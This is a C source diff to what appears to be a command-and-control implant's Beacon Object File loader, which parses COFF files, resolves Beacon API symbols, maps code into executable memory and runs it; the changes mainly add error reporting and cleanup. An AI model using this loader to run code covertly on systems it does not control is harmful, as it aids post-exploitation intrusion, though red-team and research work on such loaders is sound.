@@ -3,19 +3,13 @@
 
 #if defined(__x86_64__) || defined(_WIN64)
 char IMP_FUNC[] = "__imp_Beacon";
-char IMP_WIDE[] = "__imp_ToWideChar";
 int IMP_LENGTH = 6;
 int FUNC_LENGTH = 12;
-int WIDE_LENGTH = 16;
 #else
 char IMP_FUNC[] = "__imp__Beacon";
-char IMP_WIDE[] = "__imp__ToWideChar";
 int IMP_LENGTH = 7;
 int FUNC_LENGTH = 13;
-int WIDE_LENGTH = 17;
 #endif
-
-Boffer::Boffer() {}
 
 void* FindProcBySymbol(char* symbol)
 {
@@ -23,7 +17,7 @@ void* FindProcBySymbol(char* symbol)
 	char* moduleName = NULL;
 	char* funcName = NULL;
 
-	if (StrNCmpA(symbol, IMP_FUNC, FUNC_LENGTH) == 0 || StrNCmpA(symbol, IMP_WIDE, WIDE_LENGTH) == 0) {
+	if ( StrLenA(symbol) > IMP_LENGTH) {
 		funcName = symbol + IMP_LENGTH;
 		for (int i = 0; i < BeaconFunctionsCount; i++) {
 			if (BeaconFunctions[i][0] != NULL) {
@@ -32,7 +26,7 @@ void* FindProcBySymbol(char* symbol)
 			}
 		}
 	}
-	else if (StrNCmpA(symbol, IMP_FUNC, IMP_LENGTH) == 0) {
+	if (StrNCmpA(symbol, IMP_FUNC, IMP_LENGTH) == 0) {
 		char symbolCopy[1024] = { 0 };
 		memcpy(symbolCopy, symbol, StrLenA(symbol));
 
@@ -92,6 +86,7 @@ void CleanupSections(PCHAR* mapSections, int maxSections)
 }
 
 bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections, COF_SYMBOL* pSymbolTable, char* mapFunctions) {
+	bool status = TRUE;
 	int mapFunctionsSize = 0;
 
 	for (int sectionIndex = 0; sectionIndex < pHeader->NumberOfSections; sectionIndex++) {
@@ -100,9 +95,10 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
 
 		for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
 			COF_SYMBOL pSymbol = pSymbolTable[pRelocTable->SymbolTableIndex];
-
-			if (pRelocTable->SymbolTableIndex >= pHeader->NumberOfSymbols)
+			if (pRelocTable->SymbolTableIndex >= pHeader->NumberOfSymbols) {
+				BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
 				return FALSE;
+			}
 
 			int offset = 0;
 #ifdef _WIN64
@@ -111,8 +107,10 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
 
 			if (pSymbol.Name.cName[0] != 0) { // Internal Symbol
 				int sectionNumber = pSymbol.SectionNumber - 1;
-				if (sectionNumber < 0 || sectionNumber >= pHeader->NumberOfSections)
+				if (sectionNumber < 0 || sectionNumber >= pHeader->NumberOfSections) {
+					BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
 					return FALSE;
+				}
 
 #ifdef _WIN64
 				if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR64) {
@@ -133,24 +131,26 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
 			}
 			else { // External Symbol
 				unsigned int symOffset = pSymbol.Name.dwName[1];
-				void* procAddress = FindProcBySymbol(((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + symOffset);
-				if (!procAddress)
-					return FALSE;
-
+				char* procSymbol = ((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + symOffset;
+				void* procAddress = FindProcBySymbol(procSymbol);
+				if (!procAddress) {
+					BeaconOutput(BOF_ERROR_SYMBOL, procSymbol, StrLenA(procSymbol));
+					status = FALSE;
+				}
 #ifdef _WIN64
 				if (pRelocTable->Type == IMAGE_REL_AMD64_REL32) {
-					if (((char*)(mapFunctions + mapFunctionsSize * 8) -
-						(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4)) > 0xffffffff) {
+					if (((char*)(mapFunctions + mapFunctionsSize * 8) - (mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4)) > 0xffffffff) {
 						return FALSE;
 					}
 					memcpy(mapFunctions + mapFunctionsSize * 8, &procAddress, sizeof(unsigned long long));
-					offset = (int)((mapFunctions + mapFunctionsSize * 8) -
-						(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
+					offset = (int)((mapFunctions + mapFunctionsSize * 8) - (mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
 					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
 					mapFunctionsSize++;
 
-					if (mapFunctionsSize * 8 >= MAP_FUNCTIONS_SIZE)
+					if (mapFunctionsSize * 8 >= MAP_FUNCTIONS_SIZE) {
+						BeaconOutput(BOF_ERROR_MAX_FUNCS, procSymbol, StrLenA(procSymbol));
 						return FALSE;
+					}
 				}
 #else
 				memcpy(mapFunctions + mapFunctionsSize * 4, &procAddress, sizeof(int));
@@ -158,74 +158,84 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
 				memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
 				mapFunctionsSize++;
 
-				if (mapFunctionsSize * 4 >= MAP_FUNCTIONS_SIZE)
+				if (mapFunctionsSize * 4 >= MAP_FUNCTIONS_SIZE) {
+					BeaconOutput(BOF_ERROR_MAX_FUNCS, procSymbol, StrLenA(procSymbol));
 					return FALSE;
+				}
 #endif
 			}
 
 			pRelocTable = (COF_RELOCATION*)((char*)pRelocTable + sizeof(COF_RELOCATION));
 		}
 	}
-	return TRUE;
+	return status;
 }
 
-bool ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections)
+void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections)
 {
 	for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
 		if (StrCmpA(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
 			void(*proc)(char*, unsigned long) = (void(*)(char*, unsigned long)) (mapSections[pSymbolTable[i].SectionNumber - 1] + pSymbolTable[i].Value);
 			proc((char*)args, argsSize);
-			return TRUE;
+			return;
 		}
 	}
-	return FALSE;
+	BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
 }
 
-char* ObjectExecute(int* retSize, char* targetFuncName, unsigned char* coffFile, unsigned int cofFileSize, unsigned char* args, int argsSize)
+Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFile, unsigned int cofFileSize, unsigned char* args, int argsSize)
 {
-	output_size = 0;
-	output_offset = 0;
-
-	if (!coffFile || !targetFuncName)
-		return 0;
-
-	COF_HEADER* pHeader = (COF_HEADER*)coffFile;
-	COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);
-
-	char* entryFuncName = PrepareEntryName(targetFuncName);
-	if (!entryFuncName)
-		return 0;
-
+	COF_HEADER* pHeader      = NULL;
+	COF_SYMBOL* pSymbolTable = NULL;
+	PCHAR entryFuncName      = NULL;
+	PCHAR mapFunctions       = NULL;
+	BOOL  result			 = FALSE;
 	PCHAR mapSections[MAX_SECTIONS] = { 0 };
-	BOOL result = AllocateSections(coffFile, pHeader, mapSections);
-	if (!result) {
-		FreeFunctionName(entryFuncName);
-		return 0;
+
+	InitBofOutputData();
+	bofTaskId = taskId;
+
+	if (!coffFile || !targetFuncName) {
+		goto RET;
 	}
 
-	char* mapFunctions = (char*)ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+	pHeader = (COF_HEADER*)coffFile;
+	pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);
+
+	entryFuncName = PrepareEntryName(targetFuncName);
+	if (!entryFuncName) {
+		BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
+		goto RET;
+	}
+
+	result = AllocateSections(coffFile, pHeader, mapSections);
+	if (!result) {
+		BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
+		goto RET;
+	}
+
+	mapFunctions = (char*) ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
 	if (!mapFunctions) {
-		CleanupSections(mapSections, MAX_SECTIONS);
-		FreeFunctionName(entryFuncName);
-		return 0;
+		BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
+		goto RET;
 	}
 
 	result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable, mapFunctions);
 	if (!result) {
-		ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
-		CleanupSections(mapSections, MAX_SECTIONS);
-		FreeFunctionName(entryFuncName);
-		return 0;
-	}
 
-	beacon_output = (char*) MemAllocLocal(0);
+		goto RET;
+	}
 
 	ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections);
 
-	ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
-	CleanupSections(mapSections, MAX_SECTIONS);
-	FreeFunctionName(entryFuncName);
+RET:
+	if(mapFunctions)
+		ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
 
-	*retSize = output_size;
-	return beacon_output;
+	FreeFunctionName(entryFuncName);
+	CleanupSections(mapSections, MAX_SECTIONS);
+	
+	bofTaskId = 0;
+
+	return bofOutputPacker;
 }
